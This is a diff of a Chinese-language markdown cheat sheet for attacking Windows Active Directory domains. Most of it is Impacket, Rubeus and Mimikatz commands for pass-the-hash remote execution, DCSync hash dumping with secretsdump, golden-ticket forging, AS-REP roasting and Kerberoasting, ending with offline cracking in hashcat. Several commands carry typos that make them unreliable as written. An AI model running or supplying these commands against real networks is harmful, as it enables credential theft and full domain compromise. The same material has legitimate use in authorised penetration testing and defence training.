@@ -194,8 +194,8 @@ hash请求
 ```C
 rubeus.exe asktgt /user:administrator /rc4:asdasdasdasd /enctype:RC4 /nowrap /ptt /outfile:ticket.kirbi
 ```
-
-### 申请ST  
+  
+### 申请ST
 
 asktgs模块，跟asktgt模块参数差不多，有以下不同：  
 
@@ -230,7 +230,7 @@ rubeus.exe kerberoast /format:john /outfile:hash.txt
 rubeus.exe kerberoast /spn:SQLServer/hostname.jevon.com:1433/MSSQL /format:john /outfile:hash.txt
 ```
 
-但是这获得的hash并不能直接破解，要在指定位置加上$23，后面细说，rubeus还可以进行委派攻击，也后面细说  
+但是这获得的hash并不能直接破解，要在指定位置($krb5asrep后面)加上$23  
 
 ## Mimikatz  
 
@@ -356,4 +356,235 @@ sid::add /sam:test /new:administrator
 ```
 
 ## Impacket
+
+### 远程连接  
+
+1. psexec.py：将随机生成的exe连接文件写入IPC$共享文件夹
+2. smbexec.py：通过文件共享创建服务，通过bat脚本执行命令，默认是C$共享需要139和445端口同时开放。  
+3. wmiexec.py：依赖于admin$，135端口执行命令，445端口回显，规避AV最好。
+4. atexec.py：通过任务计划执行命令。
+5. dcomexec.py：通过DCOM实现命令执行
+6. smbclient.py：可以向服务器上传下载文件。get/put下载上传文件，shares查看共享，use使用指定共享。
+
+连接方式都差不多，smbexec需要-codec参数指定编码，不然回显乱码，-share指定共享连接：
+
+```Py
+#明文密码
+psexec.py username:password@ip          #域用户需要加上域前缀
+#hash连接
+psexec.py username@ip -hashes asdasdasdaddsa
+```
+
+### secretsdump.py
+
+利用域同步导出域用户hash，需要连接的账户和密码有域同步功能
+
+```Py
+#ntds数据库转储，sam文件转储类似
+secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM local
+#获取域内所有用户hash，使用hash获取，直接用-hashes参数
+secretsdump.py jevon/administrator:pass@x.x.x.x -just-dc
+#获取指定用户，如果是域林，则需要加域前缀
+secretsdump.py jevon/administrator:pass@x.x.x.x -just-dc-user USER
+#如果导入了管理员的票据，则不需要密码直接导出hash
+secretsdump.py -k -no-pass WIN7.jevon.com -just-dc-user administrator 
+```
+
+### ticketer.py
+
+生成黄金票据，已知目标域的krbtgt的hash和目标域的SID
+
+```Py
+#生成黄金票据
+ticketer.py -domain-sid S-X-X-X-X -nthash dasdasdasdas -domain jevon.com administrator
+#导入黄金票据
+export KRB5CCNAME=administrator.ccache
+#导出administrator的hash
+secretsdump.py -k -no-pass administrator@WIN7.jevon.com -dc-ip x.x.x.x -just-dc-user administrator 
+```
+
+### GetTGT.py  
+
+```Py
+#将会申请.ccache格式的票据
+getTGT.py jevon/administrator@x.x.x.x  -dc-ip x.x.x.x -debug
+```
+
+### getST.py
+
+jevon和jevon.com一个是默认本地域，一个是指定域
+
+```Py
+#提供账户和密码请求指定SPN服务的票据
+getST.py -dc-ip x.x.x.x -spn cifs/WIN7.jevon.com jevon.com/administrator:password
+#导入票据
+export KRB5CCNAME=administrator.ccache
+#访问服务
+smbexec.py -no-pass -k WIN7.jevon.com
+
+#导入上一步的TGT请求ST
+export KRB5CCNAME=administrator@x.x.x.x.ccache
+#请求ST
+getST.py -k -no-pass -dc-ip x.x.x.x -spn cifs/WIN7.jevon.com jevon/administrator
+#导入ST
+export KRB5CCNAME=administrator@x.x.x.x.ccache
+```
+
+### lookupsid.py
+
+如果获取域内任意账户密码，则可以获取域的SID值  
+
+```Py
+lookupsid.py jevon/jack:pass@x.x.x.x -domains-sids
+```
+
+### samrdump.py
+
+需要一个有效的域用户，通过此去枚举其他用户
+
+```Py
+samrdump.py jevon/jackLpass@x.x.x.x -csv
+```
+
+### addcomputer.py
+
+基于资源的委派，需要一个机器账户进行控制
+
+```Py
+#使用samr协议创建一个machine$账户，密码root
+addcomputer.py -computer-name 'machine$' -computer-pass 'root' -dc-ip x.x.x.x 'jevon.com/user:pass' -method SAMR -debug
+
+#使用LDAPS协议
+addcomputer.py -computer-name 'machine$' -computer-pass 'root' -dc-ip x.x.x.x 'jevon.com/user:pass' -method LDAPS -debug
+
+只需要跟上-no-add参数即可修改密码
+注意：使用samr创建的账户没有spn，使用ldaps创建的有spn
+```
+
+### GetNPUsers.py  
+
+该脚本可进行as-rep roasting攻击  
+
+```Py
+#使用该脚本自动获取user.txt文件中的用户是否设置了“不需要Kerberos预身份验证”属性，并且获取该账户的hash加密的logon session key
+GetNPUsers.py -dc-ip x.x.x.x -usersfile users.txt -format john jevon.com/
+```
+
+### GetUserSPNs.py
+
+kerberoasting攻击  
+
+```Py
+#执行下面命令查询域控所在域注册用户下的SPN，提供有效的用户名jevon/jack
+GetUserSPNs.py -dc-ip x.x.x.x jevon.com/jack:pass
+#请求用户下所有SPN的ST
+GetUserSPNs.py -request -dc-ip x.x.x.x jevon.com/jack:pass -outputfile hash.txt
+#请求指定用户下SPN的ST
+GetUserSPNs.py -request -dc-ip x.x.x.x jevon.com/jack:pass -outputfile hash.txt -request-user test
+```
+
+### ticketConverter.py
+
+将.ccache和.kirbi格式票据进行转换  
+
+```Py
+ticketConverter.py xxx.kirbi xxx.ccache
+ticketConverter.py xxx.ccache xxx.kirbi
+```
+
+### addspn.py/GetUserSPNs.py
+
+该脚本可用于增加、删除、查询spn，但是增加spn需要管理员权限  
+
+```Py
+#查询目标spn，需要提供spn参数，可以是不存在的spn
+addspn.py -u 'jevon.com/jack' -p 'pass' -t 'machine$' -s aa/aa -q x.x.x.x
+#删除目标spn，需要spn参数，必须是存在的spn
+addspn.py -u 'jevon.com/jack' -p 'pass' -t 'machine$' -s HOST/machine.jevon.com -r x.x.x.x
+#增加spn
+addspn.py -u 'jevon.com/jack' -p 'pass' -t 'machine$' -s test/test -a x.x.x.x
+```
+
+
+# 域内渗透手法  
+
+
+## Kerberoasting  
+
+在学习kerberoasting之前，我们需要了解SPN：Kerberos在进行身份验证之前，必须在服务实例用于登录的账户上注册SPN。SPN分为两种类型，一种是注册在机器账户下，一种注册在域账户下。  
+注册在机器账户下SPN的CN为Computer，注册在域用户下的CN为Users，一般是对域用户下的ST进行爆破，因为机器账户秘密是随机128位字符，不可能被爆破，如果ST是RC4_HMAC_MD5加密，可以比较简单进行爆破。一个账户下可以有多个SPN，但一个SPN只能对应一个账户。  
+
+攻击步骤：
+1. 查询域内注册于域用户下的spn
+2. 请求指定spn的ST
+3. 导出ST
+4. 对ST进行离线破解
+
+### 1.spn的发现  
+
+```Py
+#RiskySPN，这是一个脚本集合专门检测与spn相关账户是否滥用
+Import-Module .\Find-PotentiallyCrackableAccounts.ps1
+Find-PotentiallyCrackableAccounts -FullData
+```
+
+```Py
+#powerview.ps1
+Import-Module .\PowerView.ps1
+Get-NetUser -spn
+```
+
+```Py
+#Kerberoast，也是一个工具集
+csript .\GetUserSPNs.vbs
+Import-Module .\GetUsersSPNs.ps1
+```
+
+### 2.请求ST  
+
+```Py
+'Impacket请求'
+#执行下面命令查询域控所在域注册用户下的SPN，提供有效的用户名jevon/jack
+GetUserSPNs.py -dc-ip x.x.x.x jevon.com/jack:pass
+#请求用户下所有SPN的ST，并以hashcat破解格式保存
+GetUserSPNs.py -request -dc-ip x.x.x.x jevon.com/jack:pass -outputfile hash.txt
+#请求指定用户下SPN的ST，并以hashcat破解格式保存
+GetUserSPNs.py -request -dc-ip x.x.x.x jevon.com/jack:pass -outputfile hash.txt -request-user test
+```
+
+```Py
+'rubeus请求'
+#请求该账户下所有spn的票据，并以hashcat破解格式保存
+rubeus.exe /format:john /outfile:hash.txt
+#请求该账户下指定spn的票据，并以hashcat破解格式保存
+rubeus.exe kerberoast /spn:SQLServer/hostname.jevon.com:1433/MSSQL /format:john /outfile:hash.txt
+```
+
+```Py
+'mimikatz请求'
+#请求指定服务spn票据
+kerberos::ask /target:SQLServer/win7.jevonc.om:1433/MSSQL
+```
+
+### 3.导出票据
+
+```Py
+#在cmd窗口执行klist查看票据
+#导出票据
+mimikatz.exe "kerberos::list /export" "exit"
+```
+
+### 4.离线破解  
+
+```Py
+'kerberoast'
+tgsrepcrack.py pass.txt xxxx.kirbi
+```
+
+```Py
+'hashcat'
+hashcat -m 13110 hash.txt pass.txt --force
+```
+
+## 委派  
 
